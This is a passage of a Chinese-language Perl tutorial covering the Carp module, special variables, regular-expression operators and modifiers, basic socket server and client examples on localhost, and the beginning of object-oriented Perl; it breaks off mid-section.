<h3 id="carp-模块"><a href="#carp-模块" class="headerlink" title="carp 模块"></a>carp 模块</h3><p>标准 Carp 模块提供了 warn() 和 die() 函数的替代方法，它们在提供错误定位方面提供更多信息，而且更加友好。当在模块中使用时，错误消息中包含模块名称和行号。</p>
<p><strong>carp</strong> 函数可以输出程序的跟踪信息，类似于 warn 函数，通常会将该信息发送到 STDERR。</p>
<p><strong>cluck</strong> 与 warn 类似，提供了从产生错误处的栈回溯追踪。</p>
<p><strong>croak</strong> 与 die 一样，可以结束脚本。</p>
<p><strong>confess</strong> 与 die 类似，但提供了从产生错误处的栈回溯追踪。</p>
<h2 id="Perl-特殊变量"><a href="#Perl-特殊变量" class="headerlink" title="Perl 特殊变量"></a>Perl 特殊变量</h2><p>Perl 语言中定义了一些特殊的变量，通常以 <code>$, @, %</code> 作为前缀。</p>
<p>很多特殊的变量有一个很长的英文名，比如操作系统变量 <code>$!</code> 可以写为 <code>$OS_ERROR</code>。</p>
<p>如果你想使用英文名的特殊变量需要在程序头部添加 <strong>use English</strong>。</p>
<h3 id><a href="#" class="headerlink" title="$_"></a><code>$_</code></h3><p>最常用的特殊变量为 <code>$_</code> 即 <code>$ARG</code>该变量包含了默认输入和模式匹配内容。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在迭代循环中，当前循环的字符串会放在 $_ 中, 然后 通过 print 输出。另外 print 在不指定输出变量，默认情况下使用的也是 $_。</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="string">'Google'</span>,<span class="string">'Runoob'</span>,<span class="string">'Taobao'</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span> $_;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 等效于</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="string">'Google'</span>,<span class="string">'Runoob'</span>,<span class="string">'Taobao'</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="特殊变量类型"><a href="#特殊变量类型" class="headerlink" title="特殊变量类型"></a>特殊变量类型</h3><p>根据特殊的变量的使用性质，可以分为以下几类：</p>
<ul>
<li>全局标量特殊变量。</li>
<li>全局数组特殊变量。</li>
<li>全局哈希特殊变量。</li>
<li>全局特殊文件句柄。</li>
<li>全局特殊常量。</li>
<li>正则表达式特殊变量。</li>
<li>文件句柄特殊变量。</li>
</ul>
<p><a href="http://www.runoob.com/perl/perl-special-variables.html" target="_blank" rel="noopener">点此查看具体</a></p>
<h2 id="Perl-正则表达式"><a href="#Perl-正则表达式" class="headerlink" title="Perl 正则表达式"></a>Perl 正则表达式</h2><p>正则表达式(regular expression)描述了一种字符串匹配的模式，可以用来检查一个串是否含有某种子串、将匹配的子串做替换或者从某个串中取出符合某个条件的子串等。</p>
<p>Perl语言的正则表达式功能非常强大，基本上是常用语言中最强大的，很多语言设计正则式支持的时候都参考Perl的正则表达式。</p>
<p>Perl的正则表达式的三种形式，分别是匹配，替换和转化:</p>
<ul>
<li>匹配：m//（还可以简写为//，略去m）</li>
<li>替换：s///</li>
<li>转化：tr///</li>
</ul>
<p>这三种形式一般都和 <strong>=~</strong> 或 <strong>!~</strong> 搭配使用， =~ 表示相匹配，!~ 表示不匹配。</p>
<h3 id="匹配操作符"><a href="#匹配操作符" class="headerlink" title="匹配操作符"></a>匹配操作符</h3><p>匹配操作符 m// 用于匹配一个字符串语句或者一个正则表达式</p>
<p>例如，要匹配 标量 <code>$str</code> 中的 “run”，并且忽略模式中的大小写</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($str =~ <span class="regexp">m/run/</span>)&#123;</span><br><span class="line">   <span class="keyword">print</span> <span class="string">"匹配\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>模式匹配修饰符</strong></p>
<p>修饰符加在操作符最后</p>
<table>
<thead>
<tr>
<th>修饰符</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>i</td>
<td>忽略模式中的大小写</td>
</tr>
<tr>
<td>m</td>
<td>多行模式</td>
</tr>
<tr>
<td>o</td>
<td>仅赋值一次</td>
</tr>
<tr>
<td>s</td>
<td>单行模式，”.”匹配”\n”（默认不匹配）</td>
</tr>
<tr>
<td>x</td>
<td>忽略模式中的空白</td>
</tr>
<tr>
<td>g</td>
<td>全局匹配</td>
</tr>
<tr>
<td>cg</td>
<td>全局匹配失败后，允许再次查找匹配串</td>
</tr>
</tbody>
</table>
<h4 id="正则表达式变量"><a href="#正则表达式变量" class="headerlink" title="正则表达式变量"></a>正则表达式变量</h4><p>perl处理完后会给匹配到的值存在三个特殊变量名: </p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$` <span class="comment"># 匹配部分的前一部分字符串</span></span><br><span class="line">$&amp; <span class="comment"># 匹配的字符串</span></span><br><span class="line">$' <span class="comment"># 还没有匹配的剩余字符串</span></span><br></pre></td></tr></table></figure>
<p>如果将这三个变量放在一起,你将得到原始字符串。</p>
<h3 id="替换操作符"><a href="#替换操作符" class="headerlink" title="替换操作符"></a>替换操作符</h3><p>替换操作符 s/// 是匹配操作符的扩展，使用新的字符串替换指定的字符串。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">s</span>/PATTERN/REPLACEMENT/;</span><br></pre></td></tr></table></figure>
<p>PATTERN 为匹配模式，REPLACEMENT 为替换的字符串。</p>
<p><strong>替换操作修饰符</strong></p>
<table>
<thead>
<tr>
<th>修饰符</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>i</td>
<td>如果在修饰符中加上”i”，则正则将会取消大小写敏感性，即”a”和”A” 是一样的。</td>
</tr>
<tr>
<td>m</td>
<td>默认的正则开始”^”和结束<code>$</code>只是对于正则字符串如果在修饰符中加上”m”，那么开始和结束将会指字符串的每一行：每一行的开头就是”^”，结尾就是<code>$</code>。</td>
</tr>
<tr>
<td>o</td>
<td>表达式只执行一次。</td>
</tr>
<tr>
<td>s</td>
<td>如果在修饰符中加入”s”，那么默认的”.”代表除了换行符以外的任何字符将会变成任意字符，也就是包括换行符！</td>
</tr>
<tr>
<td>x</td>
<td>如果加上该修饰符，表达式中的空白字符将会被忽略，除非它已经被转义。</td>
</tr>
<tr>
<td>g</td>
<td>替换所有匹配的字符串。</td>
</tr>
<tr>
<td>e</td>
<td>替换字符串作为表达式</td>
</tr>
</tbody>
</table>
<h3 id="转化操作符"><a href="#转化操作符" class="headerlink" title="转化操作符"></a>转化操作符</h3><p>以下是转化操作符相关的修饰符：</p>
<table>
<thead>
<tr>
<th>修饰符</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>c</td>
<td>转化所有未指定字符</td>
</tr>
<tr>
<td>d</td>
<td>删除所有指定字符</td>
</tr>
<tr>
<td>s</td>
<td>把多个相同的输出字符缩成一个</td>
</tr>
</tbody>
</table>
<p>例子</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$string =~ <span class="regexp">tr/a-z/A-z/</span>;   <span class="comment"># 所有小写字母转化为大写字母</span></span><br><span class="line">$string =~ <span class="regexp">tr/a-z/a-z/s</span>;  <span class="comment"># 将变量 $string 重复的字符删除</span></span><br><span class="line">$string =~ <span class="regexp">tr/\d/ /c</span>;     <span class="comment"># 把所有非数字字符替换为空格</span></span><br><span class="line">$string =~ <span class="regexp">tr/\t //d</span>;     <span class="comment"># 删除tab和空格</span></span><br><span class="line">$string =~ <span class="regexp">tr/0-9/ /cs</span>    <span class="comment"># 把数字间的其它字符替换为一个空格。</span></span><br></pre></td></tr></table></figure>
<h3 id="更多正则表达式规则"><a href="#更多正则表达式规则" class="headerlink" title="更多正则表达式规则"></a>更多正则表达式规则</h3><table>
<thead>
<tr>
<th>表达式</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>.</td>
<td>匹配除换行符以外的所有字符</td>
</tr>
<tr>
<td>x?</td>
<td>匹配 0 次或一次 x 字符串</td>
</tr>
<tr>
<td>x*</td>
<td>匹配 0 次或多次 x 字符串,但匹配可能的最少次数</td>
</tr>
<tr>
<td>x+</td>
<td>匹配 1 次或多次 x 字符串,但匹配可能的最少次数</td>
</tr>
<tr>
<td>.*</td>
<td>匹配 0 次或多次的任何字符</td>
</tr>
<tr>
<td>.+</td>
<td>匹配 1 次或多次的任何字符</td>
</tr>
<tr>
<td>{m}</td>
<td>匹配刚好是 m 个 的指定字符串</td>
</tr>
<tr>
<td>{m,n}</td>
<td>匹配在 m个 以上 n个 以下 的指定字符串</td>
</tr>
<tr>
<td>{m,}</td>
<td>匹配 m个 以上 的指定字符串</td>
</tr>
<tr>
<td>[]</td>
<td>匹配符合 [] 内的字符</td>
</tr>
<tr>
<td>[^]</td>
<td>匹配不符合 [] 内的字符</td>
</tr>
<tr>
<td>[0-9]</td>
<td>匹配所有数字字符</td>
</tr>
<tr>
<td>[a-z]</td>
<td>匹配所有小写字母字符</td>
</tr>
<tr>
<td>[^0-9]</td>
<td>匹配所有非数字字符</td>
</tr>
<tr>
<td>[^a-z]</td>
<td>匹配所有非小写字母字符</td>
</tr>
<tr>
<td>^</td>
<td>匹配字符开头的字符</td>
</tr>
<tr>
<td>$</td>
<td>匹配字符结尾的字符</td>
</tr>
<tr>
<td>\d</td>
<td>匹配一个数字的字符,和 [0-9] 语法一样</td>
</tr>
<tr>
<td>\d+</td>
<td>匹配多个数字字符串,和 [0-9]+ 语法一样</td>
</tr>
<tr>
<td>\D</td>
<td>非数字,其他同 \d</td>
</tr>
<tr>
<td>\D+</td>
<td>非数字,其他同 \d+</td>
</tr>
<tr>
<td>\w</td>
<td>英文字母或数字的字符串,和 [a-zA-Z0-9_] 语法一样</td>
</tr>
<tr>
<td>\w+</td>
<td>和 [a-zA-Z0-9_]+ 语法一样</td>
</tr>
<tr>
<td>\W</td>
<td>非英文字母或数字的字符串,和 [^a-zA-Z0-9_] 语法一样</td>
</tr>
<tr>
<td>\W+</td>
<td>和 [^a-zA-Z0-9_]+ 语法一样</td>
</tr>
<tr>
<td>\s</td>
<td>空格,和 [\n\t\r\f] 语法一样</td>
</tr>
<tr>
<td>\s+</td>
<td>和 [\n\t\r\f]+ 一样</td>
</tr>
<tr>
<td>\S</td>
<td>非空格,和 [^\n\t\r\f] 语法一样</td>
</tr>
<tr>
<td>\S+</td>
<td>和 [^\n\t\r\f]+ 语法一样</td>
</tr>
<tr>
<td>\b</td>
<td>匹配以英文字母,数字为边界的字符串</td>
</tr>
<tr>
<td>\B</td>
<td>匹配不以英文字母,数值为边界的字符串</td>
</tr>
<tr>
<td>a\</td>
<td>b\</td>
<td>c</td>
<td>匹配符合a字符 或是b字符 或是c字符 的字符串</td>
</tr>
<tr>
<td>abc</td>
<td>匹配含有 abc 的字符串 (pattern) () 这个符号会记住所找寻到的字符串,是一个很实用的语法.第一个 () 内所找到的字符串变成 <code>$1</code> 这个变量或是 \1 变量,第二个 () 内所找到的字符串变成 <code>$2</code> 这个变量或是 \2 变量,以此类推下去.</td>
</tr>
<tr>
<td>/pattern/i</td>
<td>i 这个参数表示忽略英文大小写,也就是在匹配字符串的时候,不考虑英文的大小写问题. \ 如果要在 pattern 模式中找寻一个特殊字符,如 “*”,则要在这个字符前加上 \ 符号,这样才会让特殊字符失效</td>
</tr>
</tbody>
</table>
<h2 id="Perl-Socket-编程"><a href="#Perl-Socket-编程" class="headerlink" title="Perl Socket 编程"></a>Perl Socket 编程</h2><p><strong>创建服务端</strong></p>
<ul>
<li>使用 <strong>socket</strong> 函数来创建 socket服务。</li>
<li>使用 <strong>bind</strong> 函数绑定端口。 </li>
<li>使用 <strong>listen</strong> 函数监听端口。 </li>
<li>使用 <strong>accept</strong> 函数接收客户端请求。</li>
</ul>
<p><strong>创建客户端</strong></p>
<ul>
<li>使用 <strong>socket</strong> 函数来创建 socket 服务。</li>
<li>使用 <strong>connect</strong> 函数连接到 socket 服务端。</li>
</ul>
<h3 id="服务端函数"><a href="#服务端函数" class="headerlink" title="服务端函数"></a>服务端函数</h3><h4 id="socket-函数"><a href="#socket-函数" class="headerlink" title="socket 函数"></a>socket 函数</h4><p>用 socket（）函数来创建套接字，语法格式如下：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">socket</span>( SOCKET, DOMAIN, TYPE, PROTOCOL );</span><br></pre></td></tr></table></figure>
<p>参数解析：</p>
<ul>
<li><strong>DOMAIN</strong> 创建的套接字指定协议集。 例如：<ul>
<li><code>AF_INET</code> 表示IPv4网络协议</li>
<li><code>AF_INET6</code> 表示IPv6</li>
<li><code>AF_UNIX</code> 表示本地套接字（使用一个文件）</li>
</ul>
</li>
<li><strong>TYPE</strong> 套接字类型可以根据是面向连接的还是非连接分为SOCK_STREAM或SOCK_DGRAM</li>
<li><strong>PROTOCOL</strong> 应该是 <strong>(getprotobyname(‘tcp’))[2]</strong>。指定实际使用的传输协议。 </li>
</ul>
<p>所以 socket 函数调用方式如下：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> Socket     <span class="comment"># 定义了 PF_INET 和 SOCK_STREAM</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">socket</span>(SOCKET,PF_INET,SOCK_STREAM,(<span class="keyword">getprotobyname</span>(<span class="string">'tcp'</span>))[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>
<h4 id="bind-函数"><a href="#bind-函数" class="headerlink" title="bind() 函数"></a>bind() 函数</h4><p>使用 bind() 为套接字分配一个地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind( SOCKET, ADDRESS );</span><br></pre></td></tr></table></figure>
<p>SOCKET 一个socket的描述符。 ADDRESS 是 socket 地址 ( TCP/IP ) 包含了三个元素:</p>
<ul>
<li>地址簇 (TCP/IP, 是 AF_INET, 在你系统上可能是 2)</li>
<li>端口号 (例如 21)</li>
<li>网络地址 (例如 10.12.12.168)</li>
</ul>
<p>使用socket()创建套接字后，只赋予其所使用的协议，并未分配地址。在接受其它主机的连接前，必须先调用bind()为套接字分配一个地址。</p>
<p>简单实例如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use Socket        # 定义了 PF_INET 和 SOCK_STREAM</span><br><span class="line"></span><br><span class="line">$port = 12345;    # 监听的端口</span><br><span class="line">$server_ip_address = &quot;10.12.12.168&quot;;</span><br><span class="line">bind( SOCKET, pack_sockaddr_in($port, inet_aton($server_ip_address)))</span><br><span class="line">   or die &quot;无法绑定端口! \n&quot;;</span><br></pre></td></tr></table></figure>
<p><strong>or die</strong> 在绑定地址失败后执行。</p>
<p>通过设置 setsockopt() 可选项 SO_REUSEADDR 设置端口可立即重复使用。</p>
<p><strong>pack_sockaddr_in()</strong> 函数将地址转换为二进制格式。</p>
<h4 id="listen-函数"><a href="#listen-函数" class="headerlink" title="listen() 函数"></a>listen() 函数</h4><p>当socket和一个地址绑定之后，listen()函数会开始监听可能的连接请求。然而，这只能在有可靠数据流保证的时候使用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listen( SOCKET, QUEUESIZE );</span><br></pre></td></tr></table></figure>
<p>SOCKET : 一个socket的描述符。</p>
<p>QUEUESIZE : 是 一个决定监听队列大小的整数，当有一个连接请求到来，就会进入此监听队列；当一个连接请求被accept()接受，则从监听队列中移出；当队列满后，新的连接请求会返回错误。</p>
<p>一旦连接被接受，返回0表示成功，错误返回-1。</p>
<h4 id="accept-函数"><a href="#accept-函数" class="headerlink" title="accept() 函数"></a>accept() 函数</h4><p>accept() 函数接受请求的socket连接。如果成功则返回压缩形式的网络地址，否则返回FALSE： </p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">accept</span>( NEW_SOCKET, SOCKET );</span><br></pre></td></tr></table></figure>
<p>NEW_SOCKET : 一个socket的描述符。</p>
<p>SOCKET : 一个socket的描述符。</p>
<p>accept() 通常应用在无限循环当中：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">   <span class="keyword">accept</span>( NEW_SOCKET, SOCKT );</span><br><span class="line">   .......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="客户端函数"><a href="#客户端函数" class="headerlink" title="客户端函数"></a>客户端函数</h3><h4 id="connect-函数"><a href="#connect-函数" class="headerlink" title="connect() 函数"></a>connect() 函数</h4><p>connect()系统调用为一个套接字设置连接，参数有文件描述符和主机地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connect( SOCKET, ADDRESS );</span><br></pre></td></tr></table></figure>
<p>以下创建一个连接到服务端 socket 的实例：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$port = <span class="number">21</span>;    <span class="comment">#  ftp 端口</span></span><br><span class="line">$server_ip_address = <span class="string">"10.12.12.168"</span>;</span><br><span class="line"><span class="keyword">connect</span>( SOCKET, pack_sockaddr_in($port, inet_aton($server_ip_address)))</span><br><span class="line">    <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"无法绑定端口! \n"</span>;</span><br></pre></td></tr></table></figure>
<h3 id="完整实例"><a href="#完整实例" class="headerlink" title="完整实例"></a>完整实例</h3><p>服务端 server.pl 代码：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl -w</span></span><br><span class="line"><span class="comment"># Filename : server.pl</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> Socket;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 使用端口 7890 作为默认值</span></span><br><span class="line"><span class="keyword">my</span> $port = <span class="keyword">shift</span> || <span class="number">7890</span>;</span><br><span class="line"><span class="keyword">my</span> $proto = <span class="keyword">getprotobyname</span>(<span class="string">'tcp'</span>);</span><br><span class="line"><span class="keyword">my</span> $server = <span class="string">"localhost"</span>;  <span class="comment"># 设置本地地址</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 创建 socket, 端口可重复使用，创建多个连接</span></span><br><span class="line"><span class="keyword">socket</span>(SOCKET, PF_INET, SOCK_STREAM, $proto)</span><br><span class="line">   <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"无法打开 socket $!\n"</span>;</span><br><span class="line"><span class="keyword">setsockopt</span>(SOCKET, SOL_SOCKET, SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">   <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"无法设置 SO_REUSEADDR $!\n"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 绑定端口并监听</span></span><br><span class="line"><span class="keyword">bind</span>( SOCKET, pack_sockaddr_in($port, inet_aton($server)))</span><br><span class="line">   <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"无法绑定端口 $port! \n"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">listen</span>(SOCKET, <span class="number">5</span>) <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"listen: $!"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"访问启动：$port\n"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 接收请求</span></span><br><span class="line"><span class="keyword">my</span> $client_addr;</span><br><span class="line"><span class="keyword">while</span> ($client_addr = <span class="keyword">accept</span>(NEW_SOCKET, SOCKET)) &#123;</span><br><span class="line">   <span class="comment"># send them a message, close connection</span></span><br><span class="line">   <span class="keyword">my</span> $name = <span class="keyword">gethostbyaddr</span>($client_addr, AF_INET );</span><br><span class="line">   <span class="keyword">print</span> NEW_SOCKET <span class="string">"我是来自服务端的信息"</span>;</span><br><span class="line">   <span class="keyword">print</span> <span class="string">"Connection recieved from $name\n"</span>;</span><br><span class="line">   <span class="keyword">close</span> NEW_SOCKET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>客户端 client.pl 代码：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl -w</span></span><br><span class="line"><span class="comment"># Filename : client.pl</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> Socket;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 初始化地址与端口</span></span><br><span class="line"><span class="keyword">my</span> $host = <span class="keyword">shift</span> || <span class="string">'localhost'</span>;</span><br><span class="line"><span class="keyword">my</span> $port = <span class="keyword">shift</span> || <span class="number">7890</span>;</span><br><span class="line"><span class="keyword">my</span> $server = <span class="string">"localhost"</span>;  <span class="comment"># 主机地址</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 创建 socket 并连接</span></span><br><span class="line"><span class="keyword">socket</span>(SOCKET,PF_INET,SOCK_STREAM,(<span class="keyword">getprotobyname</span>(<span class="string">'tcp'</span>))[<span class="number">2</span>])</span><br><span class="line">   <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"无法创建 socket $!\n"</span>;</span><br><span class="line"><span class="keyword">connect</span>( SOCKET, pack_sockaddr_in($port, inet_aton($server)))</span><br><span class="line">   <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"无法连接：port $port! \n"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">my</span> $line;</span><br><span class="line"><span class="keyword">while</span> ($line = &lt;SOCKET&gt;) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"$line\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">close</span> SOCKET <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"close: $!"</span>;</span><br></pre></td></tr></table></figure>
<h2 id="Perl-面向对象"><a href="#Perl-面向对象" class="headerlink" title="Perl 面向对象"></a>Perl 面向对象</h2><p>Perl 中有两种不同地面向对象编程的实现：</p>
<ul>
<li>一是基于匿名哈希表的方式，每个对象实例的实质就是一个指向匿名哈希表的引用。在这个匿名哈希表中，存储来所有的实例属性。</li>
<li>二是基于数组的方式，在定义一个类的时候，我们将为每一个实例属性创建一个数组，而每一个对象实例的实质就是一个指向这些数组中某一行索引的引用。在这些数组中，存储着所有的实例属性。</li>
</ul>
<p>perl 的面向对象概念</p>
<ul>
<li><strong>对象</strong>：对象是对类中数据项的引用。.</li>
<li><strong>类</strong>：类是个Perl包，其中含提供对象方法的类。</li>
<li><strong>方法</strong>：方法是个Perl子程序，类名是其第一个参数。</li>
</ul>
<h3 id="类的定义"><a href="#类的定义" class="headerlink" title="类的定义"></a>类的定义</h3><p>一个类只是一个简单的包。</p>
<p>可以把一个包当作一个类用，并且把包里的函数当作类的方法来用。</p>
<p>Perl 的包提供了独立的命名空间，所以不同包的方法与变量名不会冲突。</p>
<p>Perl 类的文件后缀为 .pm。</p>
<p>接下来我们创建一个 Person 类：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Person;</span><br></pre></td></tr></table></figure>
<p>类的代码范围到脚本文件的最后一行，或者到下一个 package 关键字前。</p>
<h3 id="创建和使用对象"><a href="#创建和使用对象" class="headerlink" title="创建和使用对象"></a>创建和使用对象</h3><p>创建一个类的实例 (对象) 我们需要定义一个构造函数，大多数程序使用类名作为构造函数，Perl 中可以使用任何名字。</p>
<p>你可以使用多种 Perl 的变量作为 Perl 的对象。大多数情况下我们会使用引用数组或哈希。</p>
<p>接下来我们为 Person 类创建一个构造函数，使用了 Perl 的哈希引用。</p>
<p>在创建对象时，你需要提供一个构造函数，它是一个子程序，返回对象的引用。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Person;</span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">new</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">my</span> $class = <span class="keyword">shift</span>;</span><br><span class="line">    <span class="keyword">my</span> $self = &#123;</span><br><span class="line">        <span class="string">_firstName =&gt;</span> <span class="keyword">shift</span>,</span><br><span class="line">        <span class="string">_lastName  =&gt;</span> <span class="keyword">shift</span>,</span><br><span class="line">        <span class="string">_ssn       =&gt;</span> <span class="keyword">shift</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment"># 输出用户信息</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"名字：$self-&gt;&#123;_firstName&#125;\n"</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"姓氏：$self-&gt;&#123;_lastName&#125;\n"</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"编号：$self-&gt;&#123;_ssn&#125;\n"</span>;</span><br><span class="line">    <span class="keyword">bless</span> $self, $class;</span><br><span class="line">    <span class="keyword">return</span> $self;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$object = new Person( <span class="string">"小明"</span>, <span class="string">"王"</span>, <span class="number">23234345</span>);</span><br></pre></td></tr></table></figure>
<h3 id="定义方法"><a href="#定义方法" class="headerlink" title="定义方法"></a>定义方法</h3><p>Perl类的方法只但是是个Perl子程序而已，也即通常所说的成员函数。</p>
<p>Perl面向对象中Perl的方法定义不提供任何特别语法，但规定方法的第一个参数为对象或其被引用的包。</p>
<p>Perl 没有提供私有变量，但我们可以通过辅助的方式来管理对象数据。</p>
<p>接下来我们定义一个获取名字的方法：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">getFirstName</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $self-&gt;&#123;_firstName&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样也可以这么写：</p>
